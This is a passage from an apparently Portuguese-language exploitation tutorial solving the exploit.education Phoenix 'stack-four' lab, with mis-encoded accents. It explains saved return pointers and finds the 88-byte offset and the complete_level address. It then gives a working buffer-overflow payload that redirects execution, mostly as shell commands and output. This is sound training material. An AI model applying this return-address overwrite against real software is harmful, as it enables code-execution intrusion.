... resto de main
ret da main       &lt;- RBP
</code></pre>
<p>Assim, o stack frame de main foi restaurado gra√ßas ao rbp e rip salvos ( o rip salvo √© chamado de <strong>Saved Return Pointer (SRP)</strong> )</p>
<h1 id="-caso-voc√™-tenha-viajado-o-que-voc√™-precisa-saber"><a class="header" href="#-caso-voc√™-tenha-viajado-o-que-voc√™-precisa-saber">üåç Caso voc√™ tenha viajado, o que voc√™ precisa saber</a></h1>
<p>Existem algumas vari√°veis especiais dentro do processador:</p>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instru√ß√£o que est√° sendo executada 
</code></pre>
<p>O RIP e o RBP atuais s√£o salvos na stack quando chamamos uma fun√ß√£o, junto das outras vari√°veis:</p>
<pre><code class="language-x86asm">buffer[64]
uns int qualquer usado na fun√ß√£o
....
rbp
rip
</code></pre>
<p>Se por um buffer overflow conseguimos alterar aqueles inteiros depois do buffer, como <code>changeme</code> nos exerc√≠cios anteriores, tamb√©m conseguimos 
alterar o RIP salvo (<code>SRP</code>) e redirecionar a execu√ß√£o do programa!</p>
<h1 id="-exploit"><a class="header" href="#-exploit">üî• Exploit</a></h1>
<h2 id="-analisar-o-programa"><a class="header" href="#-analisar-o-programa">üî¨ Analisar o programa</a></h2>
<p>O programa contem 3 fun√ß√µes: <code>complete_level</code>, <code>start_level</code> e <code>main</code></p>
<p><code>main</code> printa a mensagem do come√ßo do n√≠vel e chama start_level</p>
<p><code>complete_level</code> √© a fun√ß√£o que precisamos chamar</p>
<p><code>start_level</code> √© onde a magica acontece: <code>gets()</code> (vulner√°vel) √© chamada num <code>buffer[64]</code></p>
<h2 id="-o-compilador-adicionou-coisa"><a class="header" href="#-o-compilador-adicionou-coisa">‚ÅâÔ∏è O compilador adicionou coisa???</a></h2>
<p>Se colocarmos somente um byte:</p>
<pre><code class="language-bash">$ ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
A
and will be returning to 0x40068d
</code></pre>
<p>A fun√ß√£o normalmente retorna para 0x40068d !</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*80&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d
Segmentation fault
</code></pre>
<p>Nos colocamos mais de 64 bytes (80), e conseguimos dar overflow... mas o rip n√£o mudou e mesmo assim teve seg fault.... QUE?!!!!</p>
<p>O compilador muitas vezes coloca coisas na stack por performance ou compatibilidade!</p>
<p>Alem disso, nos exemplos passados o valor que queremo mudar estava logo depois do buffer, agora tem pelo menos o RBP salvo no meio do caminho!
Ent√£o precisamos levar isso em considera√ß√£o, n√£o basta s√≥ olhar que o tamanho do buffer √© 64 e colocar 64 bytes de <code>padding</code>!</p>
<p>Em aplica√ß√µes mais complexas, essa diferen√ßa pode chegar a centenas de bytes.</p>
<p>Nos podemos encontrar essa diferen√ßa usando ferramentas como fuzzers ou geradores de padr√£o...</p>
<p>Como nosso exemplo √© simples, podemos aumentar/diminuir manualmente ate encontrar o valor certo:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*89&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x41
Segmentation fault

$ python -c &quot;print 'A'*88&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x400000
Segmentation fault
</code></pre>
<p>Isso quer dizer que apo≈õ <strong>88</strong> bytes, temos o SRP :D</p>
<h2 id="-encontrar-endere√ßo-de-complete_level"><a class="header" href="#-encontrar-endere√ßo-de-complete_level">üè† Encontrar endere√ßo de complete_level</a></h2>
<p>Voc√™ se lembra como faz? Nos usamos no exerc√≠cio passado....</p>
<blockquote>
<p>cof cof objdump -d cof cof</p>
</blockquote>
<pre><code>Se vc quer tentar sozinhx, agora √© a sua hora
.
.
.
.
.
.
.
.
.
.
.
.
.
Eai, conseguiu?
</code></pre>
<p>Encontrar endere√ßo:</p>
<pre><code class="language-x86asm">$ objdump -d stack-four | grep complete_level
000000000040061d &lt;complete_level&gt;:
</code></pre>
<p>Exploit:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<p>Esse foi um tutorial beeem longo, e com certeza o mais dif√≠cil! Se voc√™ chegou at√© aqui, parab√©ns! :D</p>
<h1 id="-solu√ß√£o"><a class="header" href="#-solu√ß√£o">üí´ Solu√ß√£o</a></h1>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../stack/phoenix/StackThree.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="../../stack/phoenix/StackFive.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../stack/phoenix/StackThree.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="../../stack/phoenix/StackFive.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
